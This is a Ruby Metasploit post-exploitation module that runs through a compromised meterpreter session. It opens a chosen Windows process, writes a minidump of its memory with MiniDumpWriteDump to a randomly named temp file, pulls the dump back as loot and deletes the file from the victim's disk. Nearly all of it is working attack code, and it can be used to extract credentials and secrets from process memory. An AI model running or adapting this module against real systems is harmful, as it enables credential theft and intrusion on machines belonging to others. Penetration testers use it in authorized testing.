##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Process

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Process Memory Dump',
        'Description' => %q{
          This module creates a memory dump of a process (to disk) and downloads the file
          for offline analysis.

          Options for DUMP_TYPE affect the completeness of the dump:

          "full" retrieves the entire process address space (all allocated pages);
          "standard" excludes image files (e.g. DLLs and EXEs in the address space) as
          well as memory mapped files. As a result, this option can be significantly
          smaller in size.
        },
        'License' => MSF_LICENSE,
        'Author' => ['smashery'],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => []
        },
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_channel_close
              core_channel_eof
              core_channel_open
              core_channel_read
              stdapi_fs_delete_file
              stdapi_fs_stat
              stdapi_railgun_api
              stdapi_sys_process_getpid
            ]
          }
        }
      )
    )
    register_options([
      OptInt.new('PID', [false, 'ID of the process to dump memory from']),
      OptString.new('PROCESS_NAME', [false, 'Name of the process(es) to dump memory from']),
      OptString.new('DUMP_PATH', [false, 'File to write memory dump to']),
      OptEnum.new('DUMP_TYPE', [ true, 'Minidump size', 'standard', ['standard', 'full']])
    ])
  end

  def get_process_handle(pid)
    result = session.railgun.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid)
    error = result['GetLastError']
    unless error == 0
      fail_with(Msf::Module::Failure::PayloadFailed, "Unable to open process: #{result['ErrorMessage']}")
    end
    result['return']
  end

  def create_file(path)
    result = session.railgun.kernel32.CreateFileW(
      path,
      'GENERIC_READ | GENERIC_WRITE',
      0,
      nil,
      'CREATE_ALWAYS',
      0,
      0
    )
    error = result['GetLastError']
    unless error == 0
      fail_with(Msf::Module::Failure::PayloadFailed, "Unable to create file: #{result['ErrorMessage']}")
    end
    result['return']
  end

  def dump_process(pid)
    process = client.sys.process.processes.select { |p| p['pid'] == pid }.flatten.first

    fail_with(Msf::Module::Failure::PayloadFailed, "Could not find process #{pid}") unless process

    name = process['name'].to_s
    path = datastore['DUMP_PATH'] || "#{session.sys.config.getenv('TEMP')}\\#{Rex::Text.rand_text_alpha(8..14)}"

    print_status("Dumping memory for #{name} (pid: #{pid}) to #{path}")

    if datastore['DUMP_TYPE'] == 'standard'
      # MiniDumpWithDataSegs | MiniDumpWithHandleData | MiniDumpWithIndirectlyReferencedMemory
      # | MiniDumpWithProcessThreadData | MiniDumpWithPrivateReadWriteMemory | MiniDumpWithThreadInfo
      dump_flags = 0x1 | 0x4 | 0x40 | 0x100 | 0x200 | 0x1000
    elsif datastore['DUMP_TYPE'] == 'full'
      # MiniDumpWithFullMemory
      dump_flags = 0x2
    end

    process_handle = nil
    file_handle = nil
    begin
      process_handle = get_process_handle(pid)
      file_handle = create_file(path)
      result = session.railgun.dbghelp.MiniDumpWriteDump(
        process_handle,
        pid,
        file_handle,
        dump_flags,
        nil,
        nil,
        nil
      )
      unless result['return']
        fail_with(Msf::Module::Failure::PayloadFailed, "Minidump failed: #{result['ErrorMessage']}")
      end
    ensure
      session.railgun.kernel32.CloseHandle(process_handle) if process_handle
      session.railgun.kernel32.CloseHandle(file_handle) if file_handle
    end

    download_dump(path)
  end

  def download_dump(path)
    loot_path = store_loot('windows.process.dump', 'application/octet-stream', session, '')
    src_stat = client.fs.filestat.new(path)
    print_status("Downloading minidump (#{Filesize.new(src_stat.size).pretty})")
    session.fs.file.download_file(loot_path, path)
    print_good("Memory dump stored at #{loot_path}")
  ensure
    print_status('Deleting minidump from disk')
    session.fs.file.delete(path)
  end

  def run
    fail_with(Failure::BadConfig, 'Only meterpreter sessions are supported by this module') unless session.type == 'meterpreter'

    if datastore['PID'] && datastore['PROCESS_NAME']
      fail_with(Failure::BadConfig, 'PROCESS_NAME and PID are mutually exclusive.')
    end

    unless datastore['PID'] || datastore['PROCESS_NAME']
      fail_with(Failure::BadConfig, 'PROCESS_NAME or PID must be set.')
    end

    print_status("Running module against #{sysinfo['Computer']} (#{session.session_host})")

    if datastore['PROCESS_NAME']
      pids = pidof(datastore['PROCESS_NAME'])
      fail_with(Failure::BadConfig, "Could not find PID for process '#{datastore['PROCESS_NAME']}'") if pids.empty?
    else
      pids = [datastore['PID']]
    end

    session_pid = session.sys.process.getpid

    pids.uniq.each do |pid|
      if pid == session_pid && !datastore['ForceExploit']
        print_warning("Skipping process #{pid}. Dumping current process is not recommended (can result in deadlock). To run anyway, set ForceExploit to True")
        next
      end

      dump_process(pid)
    end
  end
end
